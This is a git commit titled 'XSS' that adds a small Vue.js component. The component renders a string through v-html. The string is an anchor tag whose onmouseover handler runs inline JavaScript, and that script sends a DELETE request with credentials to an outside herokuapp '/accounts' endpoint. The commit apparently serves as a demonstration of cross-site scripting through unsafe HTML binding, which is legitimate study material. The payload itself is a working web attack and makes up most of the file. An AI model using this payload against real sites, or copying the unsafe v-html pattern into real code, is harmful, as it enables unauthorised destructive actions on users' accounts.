be802c7a3b8755d3ac47b00772a68d9e2f439b3c
nhatdn <nhatdn.it@gmail.com>
2022-03-29 15:21:05 +0700

    XSS

---
+++ XSS with Vuejs/App.vue
@@ -0,0 +1,39 @@
+<template>
+  <div id="app">
+    <span v-html="temp"></span>
+  </div>
+</template>
+
+<script>
+export default {
+  name: "App",
+  data: function () {
+    return {
+      temp: `<a onmouseover="console.log((() => {
+        let data = {
+          id: 1
+        };
+          async function postData(url = '', data = {}) {
+            const response = await fetch(url, {
+              method: 'DELETE',
+              mode: 'cors', 
+              cache: 'no-cache', 
+              credentials: 'same-origin', 
+              headers: {
+                'Content-Type': 'application/json',
+              
+              },
+              redirect: 'follow', 
+              referrerPolicy: 'no-referrer', 
+              body: JSON.stringify(data), 
+            });
+          return response.json(); 
+        }
+        postData('https://api-app-mess-connect.herokuapp.com/accounts', data);
+        return 'nhat';
+      })())">Mouse me!</a>`,
+      ten: "nhat",
+    };
+  },
+};
+</script>
